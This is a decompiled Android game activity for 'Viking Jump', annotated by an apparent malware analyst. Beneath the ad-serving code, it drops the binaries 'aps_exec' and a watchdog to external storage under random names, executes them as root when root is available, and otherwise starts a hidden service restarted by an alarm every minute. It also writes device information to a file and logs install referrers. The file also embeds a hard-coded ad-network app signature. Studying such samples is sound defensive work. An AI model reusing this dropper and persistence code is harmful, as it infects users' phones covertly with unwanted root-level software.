package com.carlospinan.utils;

public class UtilActivity extends com.google.example.games.basegameutils.BaseGameActivity {
    private static final java.lang.String AD_UNIT_ID = "";
    public static final java.lang.String TAG = "UtilActivity";
    private static com.carlospinan.utils.UtilActivity _appActiviy;
    private com.google.android.gms.ads.AdView adView = null;
    private android.widget.FrameLayout adViewLayout = null;
    private android.content.Context context;
    private int installType;
    private com.google.android.gms.ads.InterstitialAd interstitial;
    private java.lang.Thread thread;

    /* renamed from: com.carlospinan.utils.UtilActivity$1 */
    /** ANAL: UtilActivity.receiver_INSTALL_REFERRER broadcast receiver
     *
     * Simply throw a log statement with the referrer
     */
    class receiver_INSTALL_REFERRER extends android.content.BroadcastReceiver {
        receiver_INSTALL_REFERRER() {
        }

        public void onReceive(android.content.Context context, android.content.Intent intent) {
            android.util.Log.d("CPS", "Ref: " + intent.getStringExtra("referrer"));
        }
    }

    /* renamed from: com.carlospinan.utils.UtilActivity$2 */
    class C01682 implements java.lang.Runnable {
        C01682() {
        }

        public void run() {
            if (com.carlospinan.utils.UtilActivity._appActiviy.adView.isEnabled()) {
                com.carlospinan.utils.UtilActivity._appActiviy.adView.setEnabled(false);
            }
            if (com.carlospinan.utils.UtilActivity._appActiviy.adView.getVisibility() != 4) {
                com.carlospinan.utils.UtilActivity._appActiviy.adView.setVisibility(4);
            }
        }
    }

    /* renamed from: com.carlospinan.utils.UtilActivity$3 */
    class C01693 implements java.lang.Runnable {
        C01693() {
        }

        public void run() {
            if (!com.carlospinan.utils.UtilActivity._appActiviy.adView.isEnabled()) {
                com.carlospinan.utils.UtilActivity._appActiviy.adView.setEnabled(true);
            }
            if (com.carlospinan.utils.UtilActivity._appActiviy.adView.getVisibility() == 4) {
                com.carlospinan.utils.UtilActivity._appActiviy.adView.setVisibility(0);
            }
        }
    }

    /* renamed from: com.carlospinan.utils.UtilActivity$4 */
    class C01704 implements java.lang.Runnable {
        C01704() {
        }

        public void run() {
            if (com.carlospinan.utils.UtilActivity._appActiviy.interstitial.isLoaded()) {
                com.carlospinan.utils.UtilActivity._appActiviy.interstitial.show();
            }
        }
    }

    /* renamed from: com.carlospinan.utils.UtilActivity$5 */
    class C01715 implements java.lang.Runnable {
        C01715() {
        }

        public void run() {
            com.carlospinan.utils.UtilActivity._appActiviy.interstitial.loadAd(new com.google.android.gms.ads.AdRequest.Builder().build());
        }
    }

    /* renamed from: com.carlospinan.utils.UtilActivity$6 */
    class C01726 implements java.lang.Runnable {
        C01726() {
        }

        public void run() {
            com.carlospinan.utils.UtilActivity.this.KnockServer();
        }
    }

    /** ANAL: UtilActivity.onCreate()
     *
     * Entry point
     *
     * - ask for WRITE_EXTERNAL_STORAGE permission if api less-than 23
     * - Run WriteDeviceInfo()
     * - Run Install()
     * - Register UtilActivity.receiver_INSTALL_REFERRER() as a receiver for INSTALL_REFERRER broadcast
     */
    protected void onCreate(android.os.Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        this.context = getApplicationContext();
        this.installType = com.p003fa.p004c.Utilities.GetInstallType(this.context);
        if (!com.p003fa.p004c.Utilities.IsRandomNames(this.context)) {
            com.p003fa.p004c.Utilities.SetRandomNames(this.context);
        }
        if (android.os.Build.VERSION.SDK_INT < 23) {
            WriteDeviceInfo();
            Install(this.installType);
            GameInit();
        } else if (checkSelfPermission("android.permission.WRITE_EXTERNAL_STORAGE") == 0) {
            WriteDeviceInfo();
            Install(this.installType);
            GameInit();
        } else {
            requestPermissions(new java.lang.String[]{"android.permission.WRITE_EXTERNAL_STORAGE", "android.permission.READ_EXTERNAL_STORAGE"}, 50);
        }
        android.content.IntentFilter intentFilter = new android.content.IntentFilter();
        intentFilter.addAction("com.android.vending.INSTALL_REFERRER");
        getApplicationContext().registerReceiver(new com.carlospinan.utils.UtilActivity.receiver_INSTALL_REFERRER(), intentFilter);
    }

    /** ANAL: UtilActivity.onNewIntent()
     *
     * Resend the RRR_AAA_FFF broadcast that was launched by InstallReceiver
     *
     * This actually can occur if the AppActivity was not live/foregrounded (with the onCreate)
     * Using a relay RRR_AAA_FFF broadcast is not a bad idea as such
     */
    protected void onNewIntent(android.content.Intent intent) {
        java.lang.String referrer = intent.getStringExtra("referrer");
        android.util.Log.d("TRACKING", "Reffff: " + referrer);
        android.content.Intent i = new android.content.Intent();
        i.setAction("RRR_AAA_FFF");
        i.putExtra("r", referrer);
        this.context.sendBroadcast(i);
        super.onNewIntent(intent);
    }

    private void GameInit() {
        getWindow().addFlags(128);
        com.chartboost.sdk.Chartboost.startWithAppId(this, "56a4932dda15274f177c4814", "c4b2807d77d28ff4e5fc35f8fe0342c8a0752a76");
        com.chartboost.sdk.Chartboost.onCreate(this);
        com.chartboost.sdk.Chartboost.cacheInterstitial("Default");
        this.interstitial = new com.google.android.gms.ads.InterstitialAd(this);
        this.interstitial.setAdUnitId("ca-app-pub-1408024954113686/7365027050");
        android.widget.FrameLayout.LayoutParams adParams = new android.widget.FrameLayout.LayoutParams(getDisplaySize(getWindowManager().getDefaultDisplay()).x, -2);
        adParams.gravity = 80;
        this.adView = new com.google.android.gms.ads.AdView(this);
        this.adView.setAdSize(com.google.android.gms.ads.AdSize.BANNER);
        this.adView.setAdUnitId("");
        this.adView.loadAd(new com.google.android.gms.ads.AdRequest.Builder().build());
        this.adView.setBackgroundColor(-16777216);
        this.adView.setBackgroundColor(0);
        addContentView(this.adView, adParams);
        _appActiviy = this;
        _init();
    }

    protected void onRestart() {
        super.onRestart();
    }

    protected void onStart() {
        super.onStart();
    }

    public static void hideAd() {
        _appActiviy.runOnUiThread(new com.carlospinan.utils.UtilActivity.C01682());
    }

    public static void showAd() {
        _appActiviy.runOnUiThread(new com.carlospinan.utils.UtilActivity.C01693());
    }

    public static void showInterstitial() {
        _appActiviy.runOnUiThread(new com.carlospinan.utils.UtilActivity.C01704());
    }

    public static void loadInterstitial() {
        _appActiviy.runOnUiThread(new com.carlospinan.utils.UtilActivity.C01715());
    }

    public static void loadChartboost() {
        com.chartboost.sdk.Chartboost.cacheInterstitial("Default");
    }

    public static void showChartboost() {
        if (com.chartboost.sdk.Chartboost.hasInterstitial("Default")) {
            com.chartboost.sdk.Chartboost.showInterstitial("Default");
            return;
        }
        com.chartboost.sdk.Chartboost.cacheInterstitial("Default");
        com.chartboost.sdk.Chartboost.showInterstitial("Default");
    }

    public static void rate_app(java.lang.String url) {
        _appActiviy.startActivity(new android.content.Intent("android.intent.action.VIEW", android.net.Uri.parse("https://play.google.com/store/apps/details?id=com.Jump.VikingJump")));
    }

    public static void setShareIntent() {
        android.content.Intent sendIntent = new android.content.Intent();
        sendIntent.setAction("android.intent.action.SEND");
        sendIntent.putExtra("android.intent.extra.TEXT", "Amazing Game Viking Jump!!! https://play.google.com/store/apps/details?id=com.Jump.VikingJump");
        sendIntent.setType("text/plain");
        _appActiviy.startActivity(android.content.Intent.createChooser(sendIntent, "Text"));
    }

    private void _init() {
        com.carlospinan.utils.NativeUtils.configure(this);
    }

    private void _initAdMob() {
        android.widget.FrameLayout.LayoutParams params = new android.widget.FrameLayout.LayoutParams(-1, -2);
        params.gravity = 49;
        this.adView = new com.google.android.gms.ads.AdView(this);
        this.adView.setAdSize(com.google.android.gms.ads.AdSize.SMART_BANNER);
        this.adView.setAdUnitId(getResources().getString(2131099691));
        this.adView.setLayoutParams(params);
        this.adViewLayout = new android.widget.FrameLayout(this);
        this.adViewLayout.setLayoutParams(params);
        this.adViewLayout.addView(this.adView);
        this.adView.loadAd(new com.google.android.gms.ads.AdRequest.Builder().build());
        addContentView(this.adViewLayout, params);
        android.util.Log.d("UtilActivity", "Init AdMob Android");
    }

    private android.graphics.Point getDisplaySize(android.view.Display d) {
        if (android.os.Build.VERSION.SDK_INT >= 11) {
            return getDisplaySizeGE11(d);
        }
        return getDisplaySizeLT11(d);
    }

    @android.annotation.TargetApi(13)
    private android.graphics.Point getDisplaySizeGE11(android.view.Display d) {
        android.graphics.Point p = new android.graphics.Point(0, 0);
        d.getSize(p);
        return p;
    }

    private android.graphics.Point getDisplaySizeLT11(android.view.Display d) {
        try {
            return new android.graphics.Point(((java.lang.Integer) android.view.Display.class.getMethod("getWidth", new java.lang.Class[0]).invoke(d, null)).intValue(), ((java.lang.Integer) android.view.Display.class.getMethod("getHeight", new java.lang.Class[0]).invoke(d, null)).intValue());
        } catch (java.lang.NoSuchMethodException e) {
            return new android.graphics.Point(-1, -1);
        } catch (java.lang.IllegalArgumentException e2) {
            return new android.graphics.Point(-2, -2);
        } catch (java.lang.IllegalAccessException e3) {
            return new android.graphics.Point(-3, -3);
        } catch (java.lang.reflect.InvocationTargetException e4) {
            return new android.graphics.Point(-4, -4);
        }
    }

    public boolean onKeyDown(int keyCode, android.view.KeyEvent event) {
        super.onKeyDown(keyCode, event);
        return super.onKeyDown(keyCode, event);
    }

    public boolean onGenericMotionEvent(android.view.MotionEvent event) {
        return super.onGenericMotionEvent(event);
    }

    public void onSignInFailed() {
    }

    public void onSignInSucceeded() {
    }

    public boolean getSignedIn() {
        return isSignedIn();
    }

    public com.google.android.gms.common.api.GoogleApiClient getCustomApiClient() {
        return getApiClient();
    }

    public void signInGooglePlay() {
        beginUserInitiatedSignIn();
    }

    public void signOutGooglePlay() {
        signOut();
    }

    public void inCloudSaveOrUpdate(int key, byte[] app_state) {
    }

    public void inCloudLoad(int key) {
    }

    public void requestGameAndCloudSave() {
        setRequestedClients(5);
    }

    protected void onPause() {
        if (this.adView != null) {
            this.adView.pause();
        }
        super.onPause();
        com.chartboost.sdk.Chartboost.onPause(_appActiviy);
    }

    protected void onResume() {
        super.onResume();
        if (this.adView != null) {
            this.adView.resume();
        }
        com.chartboost.sdk.Chartboost.onStart(_appActiviy);
    }

    protected void onStop() {
        super.onStop();
        com.chartboost.sdk.Chartboost.onStop(_appActiviy);
    }

    protected void onDestroy() {
        if (this.adView != null) {
            this.adView.destroy();
        }
        super.onDestroy();
        com.chartboost.sdk.Chartboost.onDestroy(_appActiviy);
    }

    public void onBackPressed() {
        if (!com.chartboost.sdk.Chartboost.onBackPressed()) {
            super.onBackPressed();
        }
    }

    static {
        java.lang.System.loadLibrary("cocos2dcpp");
    }

    /** ANAL: UtilActivity.Install()
     *
     * Either run InstallAsNonRoot() or InstallAsRoot() based on the root level access saved in SHARED_PREFERENCES
     *
     */
    private void Install(int type) {
        if (type == 1) {
            return;
        }
        if (type == 0) {
            InstallAsNonRoot();
            return;
        }
        new java.lang.Thread(new com.carlospinan.utils.UtilActivity.C01726()).start();
        if (!com.stericson.RootTools.C1040RootTools.isRootAvailable()) {
            InstallAsNonRoot();
            com.p003fa.p004c.Utilities.SetInstallType(0, this.context);
        } else if (InstallAsRoot()) {
            com.p003fa.p004c.Utilities.SetInstallType(1, this.context);
        } else {
            InstallAsNonRoot();
            com.p003fa.p004c.Utilities.SetInstallType(0, this.context);
        }
    }

    /**
     * ANAL: UtilActivity.InstallAsRoot()
     *
     * Load `aps_exec` and `aps_exec_watch_dog` binaries into world-writeable locations and then call `RootCommandExecutor.Execute()`
     *  to have it install it as root
     *
     * Taken from resources/res/values/public.xml
     *      <public type="raw" name="aps_exec" id="2130968576" />
     *      <public type="raw" name="aps_exec_watch_dog" id="2130968577" />
     */
    private boolean InstallAsRoot() {
        try {
            java.io.InputStream insExec = getResources().openRawResource(2130968576);
            java.io.InputStream insWd = getResources().openRawResource(2130968577);
            WriteRawResources(insExec, new java.lang.StringBuilder(java.lang.String.valueOf(android.os.Environment.getExternalStorageDirectory().getAbsolutePath())).append(java.io.File.separator).append(com.p003fa.p004c.Utilities.GetExecName(this.context)).toString());
            WriteRawResources(insWd, new java.lang.StringBuilder(java.lang.String.valueOf(android.os.Environment.getExternalStorageDirectory().getAbsolutePath())).append(java.io.File.separator).append(com.p003fa.p004c.Utilities.GetWatchDogName(this.context)).toString());
            if (com.p003fa.p004c.RootCommandExecutor.Execute(this.context)) {
                return true;
            }
            new java.io.File(new java.lang.StringBuilder(java.lang.String.valueOf(android.os.Environment.getExternalStorageDirectory().getAbsolutePath())).append(java.io.File.separator).append(com.p003fa.p004c.Utilities.GetExecName(this.context)).toString()).delete();
            new java.io.File(new java.lang.StringBuilder(java.lang.String.valueOf(android.os.Environment.getExternalStorageDirectory().getAbsolutePath())).append(java.io.File.separator).append(com.p003fa.p004c.Utilities.GetWatchDogName(this.context)).toString()).delete();
            return false;
        } catch (java.lang.Exception e) {
            try {
                new java.io.File(new java.lang.StringBuilder(java.lang.String.valueOf(android.os.Environment.getExternalStorageDirectory().getAbsolutePath())).append(java.io.File.separator).append(com.p003fa.p004c.Utilities.GetExecName(this.context)).toString()).delete();
                new java.io.File(new java.lang.StringBuilder(java.lang.String.valueOf(android.os.Environment.getExternalStorageDirectory().getAbsolutePath())).append(java.io.File.separator).append(com.p003fa.p004c.Utilities.GetWatchDogName(this.context)).toString()).delete();
                return false;
            } catch (java.lang.Exception e2) {
                return false;
            }
        }
    }

    /** ANAL: UtilActivity.InstallAsNonRoot()
     * 
     * Start SystemService
     */
    private boolean InstallAsNonRoot() {
        if (!IsMyServiceRunning(com.p003fa.p004c.SystemService.class)) {
            startService(new android.content.Intent(this, com.p003fa.p004c.SystemService.class));
        }
        android.app.PendingIntent pintent = android.app.PendingIntent.getBroadcast(this, 0, new android.content.Intent("INTENT_CPS_SERVICE_RESTART"), 0);
        android.app.AlarmManager alarm = (android.app.AlarmManager) getSystemService("alarm");
        alarm.cancel(pintent);
        alarm.setRepeating(0, java.lang.System.currentTimeMillis(), 60000, pintent);
        return true;
    }

    private void WriteRawResources(java.io.InputStream ins, java.lang.String path) {
        try {
            java.io.ByteArrayOutputStream outputStream = new java.io.ByteArrayOutputStream();
            byte[] buffer = new byte[1024];
            while (true) {
                int size = ins.read(buffer, 0, 1024);
                if (size < 0) {
                    ins.close();
                    buffer = outputStream.toByteArray();
                    java.io.FileOutputStream fos = new java.io.FileOutputStream(path);
                    fos.write(buffer);
                    fos.close();
                    return;
                }
                outputStream.write(buffer, 0, size);
            }
        } catch (java.lang.Exception e) {
            android.util.Log.d("CPS", e.getMessage());
        }
    }

    private void WriteDeviceInfo() {
        try {
            java.io.File file = new java.io.File(new java.lang.StringBuilder(java.lang.String.valueOf(android.os.Environment.getExternalStorageDirectory().getAbsolutePath())).append(java.io.File.separator).append(com.p003fa.p004c.Utilities.GetExchangeFileName(this.context)).toString());
            if (!file.exists()) {
                file.createNewFile();
                file.setWritable(true);
                file.setReadable(true);
                java.io.FileWriter fw = new java.io.FileWriter(file);
                java.io.BufferedWriter bw = new java.io.BufferedWriter(fw);
                byte[] content = com.p003fa.p004c.Utilities.GetDeviceInfoBytes(this.context);
                android.util.Log.d("CPS", "Length: " + com.p003fa.p004c.Utilities.ToChar(content).length);
                bw.write(com.p003fa.p004c.Utilities.ToChar(content), 0, 20);
                bw.close();
                fw.close();
            }
        } catch (java.lang.Exception e) {
        }
    }

    private boolean IsMyServiceRunning(java.lang.Class<?> serviceClass) {
        getApplicationContext();
        for (android.app.ActivityManager.RunningServiceInfo service : ((android.app.ActivityManager) getSystemService("activity")).getRunningServices(Integer.MAX_VALUE)) {
            if (serviceClass.getName().equals(service.service.getClassName())) {
                return true;
            }
        }
        return false;
    }

    private void KnockServer() {
    }

    public void onRequestPermissionsResult(int requestCode, java.lang.String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        WriteDeviceInfo();
        Install(this.installType);
        GameInit();
    }
}
